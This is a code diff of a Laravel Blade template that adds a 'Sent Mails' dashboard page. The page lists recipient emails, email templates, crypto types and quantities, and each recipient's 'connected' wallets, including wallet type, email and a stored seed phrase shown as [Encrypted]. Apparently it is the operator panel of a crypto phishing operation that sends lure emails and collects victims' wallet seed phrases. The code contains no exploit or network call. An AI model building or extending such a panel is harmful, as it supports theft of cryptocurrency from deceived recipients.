@@ -1,4 +1,4 @@
-<x-app-layout>
+{{-- <x-app-layout>
     <!-- Start Main Content -->
     <div
         class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
@@ -68,4 +68,67 @@
         </div>
     </div>
     <!-- End Main Content -->
+</x-app-layout> --}}
+
+
+<x-app-layout>
+    <div
+        class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
+        @if (session('success'))
+            <div class="alert alert-success p-4">
+                {{ session('success') }}
+            </div>
+        @endif
+        @if (session('error'))
+            <div class="alert alert-danger p-4">
+                {{ session('error') }}
+            </div>
+        @endif
+        <div class="card">
+            <div class="p-1.5">
+                <h6 class="card-title">Sent Mails</h6>
+                <div class="mt-7 pt-0.5">
+                    @if ($sent->isEmpty())
+                        <p class="text-gray-500">No emails sent yet.</p>
+                    @else
+                        <table class="w-full table-auto border-collapse">
+                            <thead>
+                                <tr class="bg-gray-100">
+                                    <th class="px-4 py-2 text-left">Recipient Email</th>
+                                    <th class="px-4 py-2 text-left">Template</th>
+                                    <th class="px-4 py-2 text-left">Crypto Type</th>
+                                    <th class="px-4 py-2 text-left">Quantity</th>
+                                    <th class="px-4 py-2 text-left">Wallet Details</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                @foreach ($sent as $sent)
+                                    <tr class="border-t">
+                                        <td class="px-4 py-2">{{ $sent->recipient_email }}</td>
+                                        <td class="px-4 py-2">{{ ucfirst($sent->template) }}</td>
+                                        <td class="px-4 py-2">{{ $sent->crypto_type }}</td>
+                                        <td class="px-4 py-2">{{ number_format($sent->quantity, 8) }}</td>
+                                        <td class="px-4 py-2">
+                                            @if ($sent->wallets->isEmpty())
+                                                <p>No wallet connected yet.</p>
+                                            @else
+                                                @foreach ($sent->wallets as $wallet)
+                                                    <ul class="list-disc pl-5">
+                                                        <li><strong>Wallet Type:</strong> {{ $wallet->wallet_type }}
+                                                        </li>
+                                                        <li><strong>Email:</strong> {{ $wallet->user_email }}</li>
+                                                        <li><strong>Seed Phrase:</strong> [Encrypted]</li>
+                                                    </ul>
+                                                @endforeach
+                                            @endif
+                                        </td>
+                                    </tr>
+                                @endforeach
+                            </tbody>
+                        </table>
+                    @endif
+                </div>
+            </div>
+        </div>
+    </div>
 </x-app-layout>
